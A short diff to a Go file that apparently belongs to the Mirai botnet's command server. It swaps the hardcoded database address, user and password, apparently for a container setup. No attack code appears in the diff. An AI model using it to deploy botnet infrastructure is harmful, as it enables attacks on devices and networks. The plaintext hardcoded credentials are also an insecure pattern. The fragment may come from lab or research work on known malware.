@@ -7,9 +7,9 @@ import (
     "time"
 )
 
-const DatabaseAddr string   = "127.0.0.1"
-const DatabaseUser string   = "root"
-const DatabasePass string   = "password"
+const DatabaseAddr string   = "mariadb"
+const DatabaseUser string   = "user"
+const DatabasePass string   = "this-is-password!"
 const DatabaseTable string  = "mirai"
 
 var clientList *ClientList = NewClientList()
